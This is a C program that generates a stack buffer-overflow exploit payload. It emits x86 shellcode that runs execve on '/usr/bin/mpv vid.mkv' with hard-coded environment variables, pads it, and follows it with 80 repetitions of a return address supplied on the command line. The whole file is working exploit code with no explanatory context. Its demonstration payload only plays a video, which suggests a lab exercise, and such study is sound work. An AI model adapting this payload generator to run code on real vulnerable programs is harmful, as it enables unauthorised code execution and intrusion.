#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* Machine code */
const uint8_t shellcode[] = {
	0xe8, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x04, 0x24,
	0x31, 0xdb, 0x53, 0x8d, 0x58, 0x46, 0x53, 0x8d,
	0x58, 0x39, 0x53, 0x31, 0xdb, 0x53, 0x8d, 0x58,
	0x7b, 0x53, 0x8d, 0x58, 0x5c, 0x53, 0x8d, 0x58,
	0x4e, 0x53, 0x8d, 0x14, 0x24, 0x8d, 0x4c, 0x24,
	0x10, 0x8d, 0x58, 0x39, 0x8d, 0x05, 0x0b, 0x00,
	0x00, 0x00, 0xcd, 0x80, 0x8d, 0x05, 0x01, 0x00,
	0x00, 0x00, 0x31, 0xdb, 0xcd, 0x80, 0x2f, 0x75,
	0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6d,
	0x70, 0x76, 0x00, 0x76, 0x69, 0x64, 0x2e, 0x6d,
	0x6b, 0x76, 0x00, 0x48, 0x4f, 0x4d, 0x45, 0x3d,
	0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x6a, 0x63,
	0x00, 0x58, 0x44, 0x47, 0x5f, 0x52, 0x55, 0x4e,
	0x54, 0x49, 0x4d, 0x45, 0x5f, 0x44, 0x49, 0x52,
	0x3d, 0x2f, 0x72, 0x75, 0x6e, 0x2f, 0x75, 0x73,
	0x65, 0x72, 0x2f, 0x31, 0x30, 0x30, 0x30, 0x00,
	0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d,
	0x3a, 0x30, 0x00,
};

int main (int argc, char **argv)
{
	uint32_t goal = 0;

	if (argc != 2) {
		fprintf(stderr, "Usage: %s <addr>\n", argv[0]);
		exit(1);
	}

	write(STDOUT_FILENO, shellcode, sizeof(shellcode));

	/* 4 byte padding */
	for (int i = 0; (sizeof(shellcode) + i) % 4 != 0; i++)
		write(STDOUT_FILENO, "", sizeof(""));

	sscanf(argv[1], "%x", &goal);
	for (int i = 0; i < 80; i++) {
		write(STDOUT_FILENO, (void*)&goal, 4);
	}

	return 0;
}

